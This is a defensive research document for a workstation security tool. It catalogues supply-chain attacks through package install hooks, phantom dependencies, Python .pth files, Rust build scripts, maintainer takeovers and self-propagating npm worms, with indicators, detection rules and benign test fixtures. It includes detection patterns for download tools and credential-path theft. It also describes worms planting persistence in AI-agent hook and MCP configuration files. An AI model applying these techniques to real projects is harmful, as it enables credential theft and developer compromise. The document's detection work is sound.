# Software supply chain: language registries, developer tooling, IDE extensions, CI and AI-tool configuration

> Scope: compromise of a Linux developer workstation or an open-source maintainer's publishing pipeline through language package registries (npm, PyPI, crates.io, RubyGems, Go module proxy), container registries, GitHub Actions, VS Code / Open VSX extensions, AI coding tool configuration (MCP servers, rules files, agent hooks), and files that execute when a repository is opened or built. It covers install-time and build-time code execution, name-confusion attacks, maintainer account takeover, self-propagating registry worms, CI/CD poisoning, and the credentials and exfiltration channels these campaigns use. Distro packaging (apt/dnf/AUR/Flatpak, `curl | bash`, xz-utils as a distro event) belongs to [distro packaging](./03-distro-packaging-and-install-channels.md); maintainer phishing lures are covered in depth in [phishing](./01-phishing-social-engineering.md); credential storage hardening in [credentials](./06-credential-and-secret-protection.md). Last researched: 2026-10-29.

**Current Bigman coverage, read from the source (`src/inspect.rs`, `src/analyzer.rs`):**

- `bigman packages DIR|.tgz` walks up to 50,000 entries, skipping `.git`, `target` and `.venv`. It reads up to 2,000 `package.json` files and raises `package.lifecycle` (Review) for `preinstall`, `install`, `postinstall`, `prepare`, `prepublish` and `prepack`, and `package.script` (Info) for every other script. Each script command, plus any `.js/.cjs/.mjs/.sh` file the script names inside the package directory, is passed through the shell capability rules (`shell.*`).
- For a directory, the only lockfile it reads is `package-lock.json`, and only the `hasInstallScript` flag (`package.unresolved-hook` when the package is not on disk). `pnpm-lock.yaml`, `yarn.lock`, `bun.lock`, `Cargo.lock`, `uv.lock`, `poetry.lock`, `Gemfile.lock` and `go.sum` are not read.
- For `.tgz` input it streams the tarball without extracting: up to 10,000 entries, and only `package.json` and `.js/.cjs/.mjs/.sh` members are analysed.
- The capability rules are line-oriented regexes written for shell (`curl|wget`, `eval`, `base64`, `node -e`, credential paths, persistence paths). They do not model JavaScript, Python or Rust APIs such as `child_process`, `https.request`, `subprocess`, `std::process::Command`, `Function(...)` or `Buffer.from(...,'base64')`.
- Not detected: the implicit `node-gyp rebuild` that npm runs when `binding.gyp` exists, `preprepare`/`postprepare` hooks, `dependencies`/`optionalDependencies` that point at URLs or git commits, and any non-npm ecosystem.
- `bigman audit osv DIR` runs OSV-Scanner and raises one generic `osv.advisory` finding per result. OSV also carries `MAL-` malicious-package records, but Bigman reports them with the same "a vulnerability is not evidence of installed malware" wording, which undersells them.

## Summary table

| ID | Attack | Severity for a Linux desktop/dev user | Bigman today | Proposed |
|---|---|---|---|---|
| SC-01 | npm-family install-time lifecycle scripts | High | Partial | Add missing hooks, implicit `binding.gyp` builds, JS-aware rules, pnpm/yarn/bun lockfiles, approval-state check |
| SC-02 | Phantom, URL and git-commit dependencies | High | Gap | Flag non-registry specifiers and "added dependency never imported" in manifest and lockfile diffs |
| SC-03 | Python install-time and interpreter-startup code (`setup.py`, build backends, `.pth`) | High | Gap | `bigman packages` for sdist/wheel/site-packages: flag `.pth` with code, setup-time network/exec |
| SC-04 | Rust `build.rs` and proc-macro execution at build time | High | Gap | `.crate`/`Cargo.lock` inspector: build scripts, proc-macros, new transitive crates |
| SC-05 | Maintainer account takeover and publish-token theft | High | Partial (OSV only) | Provenance-drift check ("release published without trusted-publisher provenance") |
| SC-06 | Self-propagating registry worms (Shai-Hulud family) | High | Partial | Worm IOC sweep; repo-injected AI/IDE hooks; credential canaries |
| SC-07 | Typosquatting and combosquatting | Medium | Gap | Offline edit-distance and confusable check against popular-name lists |
| SC-08 | Dependency confusion (public package shadows a private name) | Medium | Gap | Registry-scope audit of `.npmrc`/`pip.conf`/`uv.toml`/`GOPRIVATE` |
| SC-09 | Slopsquatting (AI-hallucinated package names) | Medium | Gap | "Young or near-zero-download package" warning; manifest-diff review |
| SC-10 | Abandoned-package revival and expired maintainer domain takeover | Medium | Gap | Maintainer-ownership change flag in lockfile diffs; feed advisory |
| SC-11 | Protestware and maintainer sabotage | Medium | Partial (OSV) | Same pipeline as SC-05; locale/geo-conditional code rule |
| SC-12 | Compromised hosted script or CDN dependency (polyfill.io, connect-kit) | Medium | Gap | Static scan of project HTML/JS for third-party `<script src>` without SRI |
| SC-13 | Lockfile tampering and integrity drift | Medium | Partial | Lockfile linter: resolved host, integrity presence, non-registry tarballs |
| SC-14 | Registry and proxy-specific persistence (Go proxy cache, RubyGems, Cargo tar issues) | Medium | Gap | Ecosystem advisories via feeds; `go env` and toolchain-version checks |
| SC-15 | Compromised or retagged third-party GitHub Actions and CI tools | High (maintainers) | Gap | Workflow scan: unpinned `uses:`; feed-driven compromised-action list |
| SC-16 | `pull_request_target`, script injection and cache poisoning ("pwn requests") | High (maintainers) | Gap | Workflow scan for dangerous trigger, expression and cache patterns |
| SC-17 | Malicious workflow commits pushed with stolen accounts (GhostAction) | High (maintainers) | Gap | Diff `.github/workflows` against a baseline; flag new secret-referencing workflows |
| SC-18 | Poisoned or stale container images | Medium | Gap | Image reference audit: tag vs digest; signature verification guidance |
| SC-19 | Malicious or hijacked VS Code / Open VSX extensions | High | Gap | `.vsix` inspector and installed-extension inventory |
| SC-20 | Repo-open triggers (IDE tasks, git hooks, `.envrc`, devcontainers) | High | Gap | `bigman repo-check DIR` before trusting a workspace |
| SC-21 | Poisoned AI coding-tool configuration (agent hooks, project MCP, rules files) | High | Gap | Repo-check rules for `.claude/`, `.mcp.json`, `.cursor/`, instruction files, hidden Unicode |
| SC-22 | Malicious MCP servers and AI-tool packages | Medium | Gap | MCP config inventory; flag unpinned `npx`/`uvx` servers and unknown publishers |
| SC-23 | Credential harvesting and exfiltration channels (cross-cutting) | High | Partial (`shell.credentials`, canary) | Extend credential regex set; exfil-channel rules; more decoy canaries |

## Attacks

### SC-01 npm-family install-time lifecycle scripts
- **What it is:** npm, pnpm, yarn and bun can run `preinstall`, `install` and `postinstall` scripts from any package in the dependency tree. npm also runs an implicit `node-gyp rebuild` when a package ships `binding.gyp`. That code runs with the developer's user privileges and full home-directory access, before any application code imports the package. Almost every large npm incident from 2018 to 2026 used this hook, including ua-parser-js, Nx, Shai-Hulud, the axios phantom dependency, the CHAINDROP/keyv worm and the May 2026 typosquats documented by Microsoft.
- **Real-world examples:**
  - 2021-10: ua-parser-js 0.7.29/0.8.0/1.0.0 used a `preinstall` hook to drop a miner and credential stealer on Linux and Windows. https://www.cisa.gov/news-events/alerts/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js, https://github.com/advisories/GHSA-pjwm-rvh2-c87w
  - 2025-08-26: Nx "s1ngularity". A `postinstall` script inventoried secrets and posted them to a `s1ngularity-repository` repo on the victim's own GitHub account. It also appended a shutdown command to `~/.bashrc` and `~/.zshrc`. https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c
  - 2025-11 (Shai-Hulud 2.0): moved to `preinstall` (`setup_bun.js`, which installs Bun, then runs `bun_environment.js`), so the payload fires even if the install later fails. https://securelist.com/shai-hulud-2-0/118214/, https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack
  - 2026-05-28: 14 "vpmdhaj" typosquats used install/preinstall/postinstall hooks. A second generation downloaded the Bun runtime and ran a stage-2 payload. https://www.microsoft.com/en-us/security/blog/2026/05/28/typosquatted-npm-packages-used-steal-cloud-ci-cd-secrets/
- **Ecosystem defenses:**
  - **npm 12 (2026-07-08):** dependency `preinstall`/`install`/`postinstall` and implicit node-gyp builds are skipped unless allowlisted (`allowScripts` in the root `package.json`, recorded with `npm install-scripts approve`, then `npm rebuild`; opt-in `strict-allow-scripts` for CI). https://github.com/npm/cli/releases/tag/v12.0.0, https://docs.npmjs.com/cli/v12/commands/npm-install-scripts. `--allow-git` and `--allow-remote` default to `none`. https://socket.dev/blog/npm-12, https://www.infoq.com/news/2026/08/npm-12-released/
  - **pnpm:** dependency build scripts run only when allowed (`allowBuilds`). `strictDepBuilds` and `blockExoticSubdeps` are on by default in current docs. https://pnpm.io/supply-chain-security
  - **bun:** runs dependency lifecycle scripts only for `trustedDependencies`.
  - **Approval tooling:** LavaMoat `allow-scripts` offers per-package approval. https://github.com/LavaMoat/LavaMoat/tree/main/packages/allow-scripts
  - **Caveats:** `npm run`, `npx` and global installs still execute code. Commenters on npm 12 report that a pre-existing `ignore-scripts=true` silently overrides the allowlist.
- **What a defender inspects (indicators):**
  - Every `scripts.{preinstall,install,postinstall,preprepare,prepare,postprepare}` in `node_modules/**/package.json`.
  - Packages that ship `binding.gyp` but no install script.
  - Lifecycle scripts that call `node <file>` where the file is large, minified or obfuscated.
  - A runtime download of Bun or another interpreter from inside an install script.
  - Detached child processes that outlive `npm install`.
  - Read-only commands: `npm query ':attr(scripts, [postinstall])'`, `npm query ':attr(scripts, [preinstall])'`, `npm ls --all`, `npm config get ignore-scripts`, `npm config get allow-scripts`, `pnpm ignored-builds` (pnpm 10+), `find node_modules -name binding.gyp -not -path '*/node_modules/*/node_modules/*/node_modules/*'`.
- **Bigman today:** Partial.
  - Covered: `package.lifecycle`, `package.script` and the `shell.*` rules on script text and referenced files, `.tgz` inspection without extraction, and `bigman package-policy` (writes `ignore-scripts=true`).
  - Covered: `harden.npm.ignore_scripts` (Info) suggests `ignore-scripts=true` in the user `.npmrc` on npm older than 12; npm 12 already blocks dependency scripts by default ([hardening research](../research/hardening.md)).
  - Gaps:
    - `preprepare`/`postprepare` and implicit `binding.gyp` builds are not flagged.
    - The rules are shell regexes, so JavaScript droppers (`child_process`, `https.get`, `Function`, `vm.runInNewContext`, large single-line obfuscated files) mostly go unflagged.
    - Only `package-lock.json` is read, not `pnpm-lock.yaml` (`requiresBuild`), `yarn.lock` or `bun.lock`.
    - There is no check of the package manager's own script policy, so Bigman cannot tell the user "npm 11 with scripts enabled" versus "npm 12 with an allowlist".
- **Proposed mitigation / detection:**
  1. CLI (`bigman packages`):
     - Add `preprepare`/`postprepare` to the lifecycle list.
     - Add `package.native-build` (Review) for `binding.gyp` without an install script.
     - Add a `js.*` rule family run on lifecycle-referenced JS: `child_process`, `require('https'|'http'|'net'|'dns')`, `process.env` enumeration, `os.homedir()` combined with credential path fragments, `Function(`/`eval(`, very long lines (>5,000 chars) or a high ratio of non-alphanumeric characters as an "obfuscated" signal, and downloads of interpreter runtimes (`oven-sh/bun/releases`).
     - Parse `pnpm-lock.yaml` (`requiresBuild: true`), `bun.lock` and `yarn.lock`, which pairs with `.yarnrc.yml` `enableScripts`.
  2. `bigman doctor`:
     - Add `pm.scripts-policy`, which reports npm/pnpm/yarn/bun versions and whether dependency scripts are allowlisted, disabled or unrestricted. Read-only: `npm --version`, `npm config get allow-scripts ignore-scripts min-release-age`.
  3. `bigman package-policy`: offer the npm 12 `allow-scripts` form in addition to `ignore-scripts`, and warn when both are set.
  4. Optional: rehearse a single package's lifecycle script in the existing offline Bubblewrap sandbox with a fake HOME (no real credentials), reusing `trace.network`/`trace.sensitive-path`.
- **Test case idea:**
  - A temp project whose `node_modules/fixture-a/package.json` has `"postinstall": "node setup.js"` and a `setup.js` containing only `require('child_process'); console.log('fixture')`. Expect `package.lifecycle` plus `js.child-process`.
  - A second package with only `binding.gyp` and an empty `.gyp` target. Expect `package.native-build`.
  - A `pnpm-lock.yaml` fixture with `requiresBuild: true` for an absent package. Expect `package.unresolved-hook`.
- **References:**
  - https://docs.npmjs.com/cli/v11/using-npm/scripts
  - https://socket.dev/blog/npm-12
  - https://pnpm.io/supply-chain-security
  - https://www.microsoft.com/en-us/security/blog/2026/05/28/typosquatted-npm-packages-used-steal-cloud-ci-cd-secrets/
  - MITRE ATT&CK T1195.001 https://attack.mitre.org/techniques/T1195/001/, T1059.007 (JavaScript)

### SC-02 Phantom, URL and git-commit dependencies
- **What it is:** An attacker adds a dependency the legitimate code never imports, purely so the package manager installs it and runs its hook. Variants point the dependency at an HTTP(S) tarball URL or a git commit instead of a registry version. The registry web UI then shows "0 dependencies", and many scanners never fetch the target. Because the real payload sits outside the published package, inspecting the top-level tarball alone misses it.
- **Real-world examples:**
  - 2026-03-31: axios 1.14.1 and 0.30.4. A hijacked maintainer account published releases whose only change was a new dependency `plain-crypto-js@^4.2.1`, which ran a `postinstall` dropper (Linux stage: a Python RAT under `/tmp`) and then replaced its own `package.json` with a clean stub. The releases bypassed the project's OIDC trusted-publisher binding and had no matching git tag. https://www.trendaisecurity.com/en-us/resources-insights/trendai-security-blog/axios-npm-package-compromised, https://www.zscaler.com/blogs/security-research/supply-chain-attacks-surge-march-2026
  - 2025-08 to 10: PhantomRaven, 126 npm packages using "remote dynamic dependencies" (HTTP URL specifiers) fetched fresh at install time. https://www.sonatype.com/blog/phantomraven-npm-malware, https://www.theregister.com/2025/10/30/phantomraven_npm_malware/
  - 2026-05-11: the TanStack "Mini Shai-Hulud" wave delivered its payload through an injected `optionalDependencies` entry pointing to an orphaned git commit. The packages carried valid SLSA provenance because they were built by the project's own hijacked CI. https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
- **What a defender inspects (indicators):**
  - In `package.json` and lockfiles: dependency specifiers beginning with `http:`, `https:`, `git+`, `github:` or `file:`, or containing a commit hash.
  - `resolved` URLs in `package-lock.json` whose host is not the configured registry.
  - A new dependency in a patch release with no matching source change and no `require`/`import` of the name anywhere in the package.
  - Packages that delete or rename their own `package.json` after install: a mismatch between `node_modules/X/package.json` and the lockfile `integrity`. `npm ls --all` warnings about invalid or extraneous packages.
  - Read-only commands: `npm query ':attr(resolved)'` (filter non-registry hosts), `jq '.packages | to_entries[] | select(.value.resolved and (.value.resolved | startswith("https://registry.npmjs.org/") | not))' package-lock.json`, `git diff HEAD~1 -- package-lock.json`.
- **Bigman today:** Gap. Lockfile reading is limited to `hasInstallScript`. The `.tgz` mode never looks at the dependency map.
- **Proposed mitigation / detection:** CLI rules in `bigman packages`:
  - `package.remote-dependency` (High): a non-registry specifier in `dependencies`, `optionalDependencies` or `peerDependencies`, or a `resolved` URL outside the configured registry.
  - `package.unused-dependency` (Review), computed only for `.tgz` input: a declared dependency name never appears in any `require(`/`import`/`from` string in the package's JS.
  - `package.manifest-mismatch` (Review): the installed `package.json` version differs from the lockfile entry.
  - Also add `bigman packages --diff OLD_LOCK NEW_LOCK` to list newly introduced packages and those with lifecycle scripts, which is the review a maintainer should do on every dependency bump.
- **Test case idea:** A synthetic `.tgz` whose `package.json` lists `"helper": "https://example.invalid/helper.tgz"` and whose `index.js` never mentions `helper`. Expect `package.remote-dependency` and `package.unused-dependency`. Then a lockfile fixture with a `resolved` pointing at `https://example.invalid/`.
- **References:**
  - https://www.trendaisecurity.com/en-us/resources-insights/trendai-security-blog/axios-npm-package-compromised
  - https://www.sonatype.com/blog/phantomraven-npm-malware
  - https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
  - T1195.001

### SC-03 Python install-time and interpreter-startup code (`setup.py`, build backends, `.pth`)
- **What it is:** Installing a Python source distribution (sdist) executes its build backend: `setup.py` for setuptools, or whatever `pyproject.toml [build-system]` names. Arbitrary code therefore runs at `pip install` time. Wheels do not run code at install, but they can drop a `*.pth` file into `site-packages`. The `site` module processes `.pth` files at every interpreter start, and lines beginning with `import` are executed. That gives code execution on every `python` invocation, including pip itself, IDE language servers and unrelated scripts, with no `import` of the package needed. `sitecustomize.py`/`usercustomize.py` and console-script entry points that shadow common commands are related startup hooks.
- **Real-world examples:**
  - 2026-03-24: LiteLLM 1.82.7/1.82.8 on PyPI, published with a token stolen via the compromised Trivy GitHub Action. 1.82.8 added `litellm_init.pth` (~34 KB, double base64), so the stealer ran on any Python startup. https://github.com/BerriAI/litellm/issues/24518, https://snyk.io/articles/poisoned-security-scanner-backdooring-litellm
  - 2024-12: Ultralytics 8.3.41/8.3.42 (and later 8.3.45/8.3.46) shipped a cryptominer after a GitHub Actions compromise. https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/
  - 2026-03-27 and 2026-04: Telnyx SDK 4.87.1/4.87.2, `lightning` 2.6.2/2.6.3 and Xinference 2.6.0-2.6.2 were reported backdoored. These come from secondary reporting only, so treat the versions as unverified.
  - 2022-12: PyTorch nightly `torchtriton` dependency confusion (see SC-08).
- **What a defender inspects (indicators):**
  - `*.pth` files in every `site-packages`/`dist-packages` (system, `--user`, venvs, `uv`/`pipx` environments) that contain a line starting with `import`, especially long or encoded lines.
  - `sitecustomize.py`/`usercustomize.py` that the user did not create.
  - In sdists: `setup.py` or a custom in-tree build backend (`backend-path`) that uses `subprocess`, `os.system`, `urllib`, `socket`, `base64` or `exec`.
  - Wheel `RECORD` files listing `.pth` files outside the package's own directory.
  - `entry_points.txt` console scripts that shadow common commands (`pip`, `python`, `git`).
  - Read-only commands: `python3 -c 'import site,sys; print(site.getsitepackages(), site.getusersitepackages())'`, `find ~/.local/lib /usr/lib/python3*/site-packages /usr/local/lib -name '*.pth' -exec grep -l '^import' {} +`, `pip inspect` (JSON inventory, no network), `pip-audit` (vulnerabilities), `unzip -l pkg.whl`, `tar -tzf pkg.tar.gz`.
- **Bigman today:** Gap. `bigman packages` only reads `package.json`, and the walker even skips `.venv`.
- **Proposed mitigation / detection:**
  1. Extend `bigman packages` to accept `.whl` (zip) and `.tar.gz` sdists, without extracting to disk:
     - `py.pth-exec` (High): a `.pth` with an executable line.
     - `py.setup-exec` (Review): `setup.py` or a custom backend with process, network or decoding calls (Python-aware regex).
     - `py.entrypoint-shadow` (Review).
     - `py.native-build` (Info): an `ext_modules` or `build.py` extension build.
  2. A read-only `bigman packages --python-env` that enumerates `site-packages` of the default interpreter and any `.venv` under a project, reporting `py.pth-exec` and unexpected `sitecustomize`.
  3. A monitor/baseline option to snapshot `.pth` files in the user site directory, alongside the existing `bigman changes` locations; persistence-baseline cross-reference: [host integrity](./04-host-integrity-and-hardening-audit.md).
  4. A doctor check for pip/uv cooldown settings: `uv` `exclude-newer` (relative durations since uv 0.9.17) and pip 26 `--uploaded-prior-to`.
- **Test case idea:**
  - A temp `site-packages` containing `fixture.pth` with `import sys; sys.stdout.write("")` and a benign `paths.pth` with only a directory line. Expect exactly one `py.pth-exec`.
  - A synthetic sdist tarball whose `setup.py` contains the text `import subprocess` and `urllib.request`, but which is never executed.
- **References:**
  - https://docs.python.org/3/library/site.html
  - https://github.com/BerriAI/litellm/issues/24518
  - https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/
  - https://ichard26.github.io/blog/2026/01/whats-new-in-pip-26.0
  - https://docs.astral.sh/uv/reference/settings/#exclude-newer
  - https://github.com/DataDog/guarddog (PyPI heuristics)
  - T1195.001, T1546 (Event Triggered Execution), T1059.006

### SC-04 Rust `build.rs` and proc-macro execution at build time
- **What it is:** Cargo compiles and runs every dependency's `build.rs` on the host before compiling the crate. Procedural macros are compiled into plugins that run inside `rustc`. Both execute arbitrary code during `cargo build`, `cargo check`, `cargo test` and IDE analysis (rust-analyzer runs build scripts and proc-macros by default). Simply opening a Rust project in an editor can therefore run dependency code. A compromised maintainer only needs to add a typosquatted dependency whose build script does the work.
- **Real-world examples:**
  - 2026-08-20: arrayref 0.3.10, internment 0.8.7 and append-only-vec 0.1.9 were published from a presumed-compromised maintainer account. Each added a typosquatted dependency (`proc-macro1`) whose build script fetched a payload. The versions were removed within about 86-107 minutes, and decoy crates (`arone`, `tinymember` and others) were deleted. Wiz reports infrastructure overlap with DPRK campaigns, but this is not a formal attribution. https://thehackernews.com/2026/08/rust-supply-chain-attack-puts-build.html, https://www.wiz.io/blog/rust-supply-chain-attack-on-arrayref-significant-overlap-with-dprk-campaigns, https://rustsec.org/advisories/RUSTSEC-2026-0259
  - 2026-02 to 06: several small crates were removed for `.env`/SSH-key theft (for example `time-sync`, `tracing-ethers`), per RustSec 2026 advisories (titles seen via osv.dev; individual pages not all opened).
  - 2026-03 / 2026-05: Cargo itself had extraction bugs. CVE-2026-33056 let a crate change directory permissions during extraction, and CVE-2026-5223 involved tarball symlinks; crates.io was not affected because it rejects symlinks. https://blog.rust-lang.org/2026/03/21/cve-2026-33056, https://blog.rust-lang.org/2026/05/25/cve-2026-5223/
- **What a defender inspects (indicators):**
  - New crates in `Cargo.lock` after an update, especially names one edit away from popular crates (`proc-macro1` vs `proc-macro2`).
  - Crates whose `Cargo.toml` has `build = ...` or a `build.rs` that uses `std::process::Command`, `std::net`, `reqwest`/`ureq`, `include_bytes!` of opaque blobs, or `env::var("HOME")`.
  - `[lib] proc-macro = true` in a crate that has no reason to be a macro.
  - Cached copies in `~/.cargo/registry/cache/*/*.crate` and sources in `~/.cargo/registry/src/`.
  - Read-only commands: `cargo tree --locked --offline -e normal,build`, `cargo metadata --locked --offline --format-version 1 | jq '.packages[] | select(.targets[].kind[] == "custom-build") | .name'`, `cargo audit` (RustSec, includes yanked and informational "malicious" entries), `cargo deny check advisories bans sources`, `cargo vet`, `ls ~/.cargo/registry/cache/*/ | grep -E 'arrayref-0.3.10'`.
- **Bigman today:** Gap.
- **Proposed mitigation / detection:**
  1. `bigman packages` accepts `.crate` files (gzip tar), a crate source directory or a project with `Cargo.lock`:
     - `rust.build-script` (Review) for any `build.rs`, escalating to High when it contains `Command::new`, `TcpStream`, an HTTP client crate, or home/credential path fragments.
     - `rust.proc-macro` (Info).
     - `rust.new-crate` in `--diff` mode.
  2. Doctor: report rust-analyzer settings that control build-script and proc-macro execution (`rust-analyzer.cargo.buildScripts.enable`, `rust-analyzer.procMacro.enable`) as information for users who open untrusted Rust repos.
  3. Feed-driven: ingest RustSec (`rustsec/advisory-db`, informational = "unsound"/"unmaintained"; removed-crate notices) and match against `Cargo.lock` and `~/.cargo/registry/cache` filenames, without needing `cargo-audit` installed.
- **Test case idea:** A synthetic crate directory whose `build.rs` contains the strings `std::process::Command::new("true")` and `fn main(){}`, never compiled. Expect `rust.build-script` High. A `Cargo.lock` diff fixture adding `proc-macro1` next to `proc-macro2` triggers `rust.new-crate` and the SC-07 lookalike rule.
- **References:**
  - https://doc.rust-lang.org/cargo/reference/build-scripts.html
  - https://github.com/rustsec/rustsec
  - https://github.com/EmbarkStudios/cargo-deny
  - https://github.com/mozilla/cargo-vet
  - https://thehackernews.com/2026/08/rust-supply-chain-attack-puts-build.html
  - T1195.001

### SC-05 Maintainer account takeover and publish-token theft
- **What it is:** An attacker gains publish rights to a legitimate, popular package and ships a malicious version under the real name. They get those rights by phishing the maintainer (fake 2FA-reset mail), reusing leaked passwords, stealing long-lived publish tokens from developer machines or CI, or social-engineering co-maintainership. Downstream users on caret ranges (`^1.2.3`) or with automated updates receive it within minutes. Name checks, typosquat detection and reputation all pass, so the main signals are publication anomalies: no matching git tag, missing provenance where it used to exist, an unusual publisher, or a burst of releases.
- **Real-world examples:**
  - 2018-11: event-stream. A new co-maintainer, given access by the original author, added `flatmap-stream` targeting a Bitcoin wallet. https://github.com/dominictarr/event-stream/issues/116, https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident
  - 2021-10: ua-parser-js account hijack. https://github.com/advisories/GHSA-pjwm-rvh2-c87w
  - 2023-12-14: Ledger `@ledgerhq/connect-kit`. A former employee's npm account was phished, and a wallet drainer was injected into dApps that loaded the library. https://www.ledger.com/blog/a-letter-from-ledger-chairman-ceo-pascal-gauthier-regarding-ledger-connect-kit-exploit
  - 2025-09-08: chalk, debug and 16 others (about 2 billion weekly downloads). The maintainer was phished via a lookalike npm support domain that captured password and TOTP. The browser payload hooked wallet and `fetch` APIs. https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised, https://www.stepsecurity.io/blog/20-popular-npm-packages-compromised-chalk-debug-strip-ansi-color-convert-wrap-ansi
  - 2026-03-31: axios. The maintainer account was hijacked and its email changed; releases bypassed trusted publishing (SC-02). Google Threat Intelligence attribution to UNC1069 is reported second-hand and unverified here.
  - 2026-05/06: `@antv` (maintainer `atool`) and `@redhat-cloud-services` (an employee's GitHub account used to push orphan commits that CI then published with valid provenance). https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
- **Ecosystem defenses:**
  - **npm:**
    - Trusted publishing (OIDC) has been GA since 2025-07-31, with automatic provenance. https://github.blog/changelog/2025-07-31-npm-trusted-publishing-with-oidc-is-generally-available/, https://docs.npmjs.com/trusted-publishers
    - Classic tokens were revoked on 2025-12-09, and write-capable granular tokens are capped at 90 days (default 7). https://github.blog/changelog/2025-11-05-npm-security-update-classic-token-creation-disabled-and-granular-token-changes/, https://github.blog/changelog/2025-12-09-npm-classic-tokens-revoked-session-based-auth-and-cli-token-management-now-available/
    - 2FA-bypass tokens are being deprecated: sensitive actions were removed in August 2026, and direct publishing is planned to end around January 2027 in favour of staged publishing with human 2FA approval. https://socket.dev/blog/npm-12
    - Overall plan: https://github.blog/2025-12-15-our-plan-for-a-more-secure-npm-supply-chain/
  - **PyPI:** trusted publishers and PEP 740 attestations. https://docs.pypi.org/trusted-publishers/, https://docs.pypi.org/attestations/
  - **Sigstore/SLSA:** provenance proves which workflow built an artifact. It does not prove the workflow or its source was not hijacked (see the TanStack and Red Hat waves, which carried valid provenance).
- **What a defender inspects (indicators):**
  - Versions published without the provenance or attestation that earlier versions carried. `npm audit signatures` verifies registry signatures and provenance for installed packages and is read-only.
  - A version on the registry with no corresponding git tag or release.
  - A sudden maintainer or email change (registry metadata `maintainers`, `_npmUser`).
  - Multiple major lines (for example 1.x and 0.x) republished within minutes.
  - Publish time within the last few hours, which is the case for most compromised versions caught within 1-12 hours.
  - On the maintainer side: write-capable tokens in `~/.npmrc` (`_authToken=`), `~/.pypirc`, `~/.cargo/credentials.toml`, `~/.gem/credentials` and `~/.config/gh/hosts.yml`.
- **Bigman today:** Partial.
  - `bigman audit osv` surfaces known `MAL-`/GHSA records once published, but with generic wording.
  - `shell.credentials` flags scripts referencing `.npmrc`/`NPM_TOKEN`.
  - `bigman doctor` detects Git's plaintext `store` helper, but not plaintext registry tokens.
- **Proposed mitigation / detection:**
  1. `osv.malicious` (High): split OSV results whose ID starts with `MAL-` (OpenSSF malicious-packages) from vulnerability advisories, with guidance to "treat the host as exposed and rotate credentials" rather than "update".
  2. Doctor `registry.plaintext-token` (Review): presence (not contents) of `_authToken` lines in `~/.npmrc`, `password` in `~/.pypirc`, `~/.cargo/credentials.toml` and `~/.gem/credentials`, with guidance on trusted publishing and short-lived tokens. Cross-reference: [credentials](./06-credential-and-secret-protection.md).
  3. Optional networked check `bigman packages --provenance` that calls the registry's metadata API for packages in a lockfile and flags `package.provenance-drop` when the newest installed version lacks provenance that the previous version had. Run only on explicit request, since Bigman has no telemetry.
  4. Release-age guidance: doctor reports whether a cooldown is configured.
     - npm: `min-release-age` (days, npm ≥ 11.10).
     - pnpm: `minimumReleaseAge` (minutes; 1440 default in current docs).
     - yarn 4.10+: `npmMinimalAgeGate`.
     - bun: `minimumReleaseAge` in `bunfig.toml` (seconds).
     - Renovate: `minimumReleaseAge`.
     - uv: `exclude-newer`.
     - pip 26: `--uploaded-prior-to`.
     Units differ; see the references.
- **Test case idea:**
  - A canned OSV-Scanner JSON with one `MAL-2025-0000` record and one GHSA record. Expect one `osv.malicious` (High) and one `osv.advisory` (Review).
  - A fake HOME with `~/.npmrc` containing `//registry.npmjs.org/:_authToken=fixture`. Expect `registry.plaintext-token` without the token value in evidence.
- **References:**
  - https://docs.npmjs.com/generating-provenance-statements
  - https://www.sigstore.dev/
  - https://slsa.dev/
  - https://peps.python.org/pep-0740/
  - https://socket.dev/blog/npm-introduces-minimumreleaseage-and-bulk-oidc-configuration
  - https://pnpm.io/settings#minimumreleaseage
  - https://yarnpkg.com/configuration/yarnrc#npmMinimalAgeGate
  - https://bun.com/docs/pm/cli/install
  - https://docs.renovatebot.com/configuration-options/#minimumreleaseage
  - T1195.001, T1078 (Valid Accounts)

### SC-06 Self-propagating registry worms (Shai-Hulud family)
- **What it is:** Malware delivered through an install hook that harvests the victim's registry and GitHub tokens, then uses them to republish every package the victim can publish, with the same hook added. One infected maintainer therefore becomes many infected packages. Since late 2025 the waves have also written persistence into the victim's repositories: AI-agent hooks (`.claude/settings.json`), VS Code `folderOpen` tasks and GitHub workflows. Developers who merely clone and open those repos get re-infected (SC-20/SC-21). Some variants include destructive fallbacks (home-directory wipe on failure or token revocation).
- **Real-world examples:**
  - 2025-09-15: Shai-Hulud, 500+ packages. It ran TruffleHog-style secret scans and exfiltrated to a public "Shai-Hulud" repo and webhook.site. CISA alert 2025-09-23. https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem, https://unit42.paloaltonetworks.com/npm-supply-chain-attack/
  - 2025-11-21/24: "Sha1-Hulud: The Second Coming", 700-800+ packages and 25,000+ repos. It used a `preinstall` hook with a Bun-based payload, registered the host as a self-hosted GitHub Actions runner, and had a wiper fallback. https://securelist.com/shai-hulud-2-0/118214/, https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack
  - 2026-04/05: "Mini Shai-Hulud" waves (`@bitwarden/cli` 2026.4.0, SAP `@cap-js/*`, TanStack, `@antv`). They harvested `~/.claude.json`, `~/.claude/mcp.json` and `~/.kiro/settings/mcp.json`, pushed `.claude/` files into repos, and the TanStack wave used a dead-man's-switch wipe. https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
  - 2026-08-04: CHAINDROP (keyv family, 400+ packages, 1,381 versions). It added `SessionStart` hooks in `.claude/settings.json` and `folderOpen` tasks in `.vscode/tasks.json` to up to 50 branches per repo, and resolved its C2 via an Ethereum contract with GitHub commit-search fallback. https://www.elastic.co/security-labs/shai-hulud-chaindrop-npm-supply-chain, https://www.aikido.dev/blog/keyv-and-friends-compromised-in-npm-supply-chain-attack
- **What a defender inspects (indicators):**
  - Public repositories on your own GitHub account that you did not create (names or descriptions mentioning Shai-Hulud, `s1ngularity-repository`, `tpcp-docs-`, "Configuration Storage").
  - Unexpected self-hosted runners registered to your repos.
  - Commits by unfamiliar identities touching `.claude/`, `.vscode/tasks.json` or `.github/workflows/`.
